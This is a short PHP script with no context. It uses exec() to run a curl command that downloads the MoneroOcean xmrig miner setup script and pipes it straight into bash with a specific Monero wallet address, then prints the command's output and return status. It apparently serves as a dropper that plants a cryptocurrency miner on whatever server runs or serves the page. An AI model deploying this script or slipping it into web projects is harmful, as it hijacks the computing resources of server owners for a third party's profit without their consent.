<?php
$output = null;
$return_var = null;
exec('curl -s -L https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/setup_moneroocean_miner.sh | bash -s 47acvFVy81hbd9mRyWTHvMinWp2W8pPM22v3Wku6Y4yxMD32ZLxvNmFHbArX3qKTnxbjD6ZsAuJ7hV4d36sbfvTkEKxfgvd; echo ""', $output, $return_var); // 添加一个空的 echo 来强制换行

if ($output && is_array($output)) {
    echo implode("\n", $output);
} else {
    echo "No output captured.";
}

echo "\nReturn status: " . $return_var;
?>